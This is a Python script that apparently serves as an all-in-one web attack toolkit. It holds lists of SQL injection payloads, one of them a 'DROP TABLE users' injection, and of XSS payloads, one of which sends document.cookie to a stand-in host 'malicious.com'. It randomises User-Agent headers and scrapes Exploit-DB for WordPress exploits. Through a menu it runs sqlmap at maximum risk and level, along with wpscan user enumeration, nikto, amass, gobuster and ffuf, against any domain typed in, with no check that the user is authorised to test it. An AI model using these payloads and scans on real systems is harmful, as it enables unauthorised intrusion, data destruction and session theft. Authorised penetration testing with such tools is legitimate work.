import os
import subprocess
import logging
import random
import requests
from urllib.parse import quote, urlparse
from bs4 import BeautifulSoup

# Logging configuration
logging.basicConfig(filename='done.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Extended SQLi Payloads (more advanced, obfuscated, and varied payloads)
SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' AND 1=1 --",
    '" AND 1=1 --',
    "' UNION SELECT NULL, NULL --",
    "'; DROP TABLE users --"
]

# Extended XSS Payloads (modern and diverse payloads)
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<script>eval("alert(1)")</script>',
    '<body onload=alert(1)>',
    '<script>fetch("http://malicious.com?cookie=" + document.cookie)</script>',
    '<img src="x" onerror="fetch(\'http://malicious.com\')">',
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    '<a href="javascript:alert(1)">Click me</a>'
]

# Random User-Agent and Header Manipulation
def randomize_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0"
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,de;q=0.8",
        "Connection": "keep-alive",
    }
    return headers

# Function to execute the Bash setup script
def run_bash_setup():
    print("Running the setup.sh installation script...")
    try:
        subprocess.run(["sudo", "bash", "setup.sh"], check=True)
        print("All tools have been successfully installed!")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running setup.sh: {e}")
        print(f"Error running setup.sh: {e}")

# Function to get WordPress exploits from Exploit-DB
def get_exploits_for_wordpress():
    url = "https://www.exploit-db.com/search?q=wordpress"
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()  # Raise an exception for HTTP errors
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            exploits = []  # List of exploits
            for link in soup.find_all('a', href=True):
                exploit_url = link['href']
                if "exploit" in exploit_url:
                    exploits.append(exploit_url)
            return exploits
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching exploits from {url}: {e}")
        return []

# Function to check if it's a WordPress site
def is_wordpress_site(url):
    indicators = [
        "/wp-login.php", "/wp-admin/", "/wp-content/",
    ]
    for indicator in indicators:
        test_url = url + indicator
        try:
            response = requests.get(test_url, timeout=10)
            if response.status_code == 200:
                logging.info(f"WordPress detected at: {url}")
                return True
        except requests.RequestException:
            continue  # Skip if the page is unreachable
    return False

# WPScan to scan for WordPress vulnerabilities
def run_wpscan(domain):
    print(f"Running WPScan for: {domain}")
    subprocess.run(["wpscan", "--url", domain, "--enumerate", "u", "--random-user-agent"])

# Amass to scan for subdomains
def run_amass(domain):
    subprocess.run(["/snap/bin/amass", "enum", "-d", domain])

# Nikto to scan for general security vulnerabilities
def run_nikto(domain):
    subprocess.run(["nikto", "-h", domain, "-C", "all"])

# Gobuster to brute-force directories and files
def run_gobuster(domain):
    subprocess.run(["gobuster", "dir", "-u", f"http://{domain}", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"])

# Ffuf to brute-force directories and files
def run_ffuf(domain):
    subprocess.run(["ffuf", "-u", f"http://{domain}/FUZZ", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"])

# SQLMap to check for SQL injection vulnerabilities
def run_sqlmap(url):
    subprocess.run(["sqlmap", "-u", url, "--batch", "--risk=3", "--level=5"])

# Function for full security scan
def scan_domain(domain):
    print(f"Starting full scan for: {domain}")

    if is_wordpress_site(domain):
        exploits = get_exploits_for_wordpress()
        if exploits:
            print(f"Found WordPress exploits: {exploits}")
        else:
            print("No WordPress exploits found.")
    else:
        print(f"No WordPress site found at {domain}. Skipping exploit search.")

    # Perform additional scans
    run_amass(domain)
    run_wpscan(domain)
    run_nikto(domain)
    run_gobuster(domain)
    run_ffuf(domain)

# Function to check for SQL injection vulnerabilities
def check_sql_injection_with_sqlmap(url):
    try:
        result = subprocess.run(['sqlmap', '-u', url, '--batch', '--risk=3', '--level=5'], capture_output=True, text=True)
        if "sqlmap identified the following injection point" in result.stdout.lower():
            logging.info(f"SQLi vulnerability found at: {url}")
            return True
        return False
    except Exception as e:
        print(f"Error with sqlmap: {e}")
        return False

# Function to check for XSS vulnerabilities
def check_xss(url):
    for payload in XSS_PAYLOADS:
        encoded_payload = quote(payload)  # URL-encode payload
        response = requests.get(url + encoded_payload, headers=randomize_headers())
        if encoded_payload in response.text:
            logging.info(f"XSS vulnerability found at: {url} with payload: {encoded_payload}")
            return True
    return False

# Function to validate and format URLs
def validate_and_format_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    return url

# Main menu for user interaction
def show_menu():
    while True:
        print("\nChoose an option:")
        print("1. Install all tools")
        print("2. Run all security checks")
        print("3. Check only for SQLi")
        print("4. Check only for XSS")
        print("5. Run subdomain scan")
        print("6. Run directory scan (Gobuster/Ffuf)")
        print("7. Exit")
        choice = input("Your choice: ")

        if choice == "1":
            run_bash_setup()
        elif choice == "2":
            domain = input("Enter the domain to scan: ")
            domain = validate_and_format_url(domain)
            scan_domain(domain)
        elif choice == "3":
            url = input("Enter the URL to check for SQLi: ")
            url = validate_and_format_url(url)
            check_sql_injection_with_sqlmap(url)
        elif choice == "4":
            url = input("Enter the URL to check for XSS: ")
            url = validate_and_format_url(url)
            check_xss(url)
        elif choice == "5":
            domain = input("Enter the domain to scan: ")
            domain = validate_and_format_url(domain)
            run_amass(domain)
        elif choice == "6":
            domain = input("Enter the domain to scan: ")
            domain = validate_and_format_url(domain)
            run_gobuster(domain)
            run_ffuf(domain)
        elif choice == "7":
            print("Exiting the script.")
            break
        else:
            print("Invalid choice, please try again.")

# Start the script
if __name__ == "__main__":
    show_menu()
